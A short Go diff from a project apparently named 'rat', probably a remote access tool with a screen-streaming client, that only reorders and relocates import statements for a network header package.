@@ -4,12 +4,11 @@ import (
 	"bytes"
 	"image"
 	"image/jpeg"
-	"rat/client/network/header"
 	"rat/client/screen"
-
-	"gopkg.in/mgo.v2/bson"
+	"rat/shared/network/header"
 
 	"github.com/disintegration/imaging"
+	"gopkg.in/mgo.v2/bson"
 )
 
 var screenStream bool
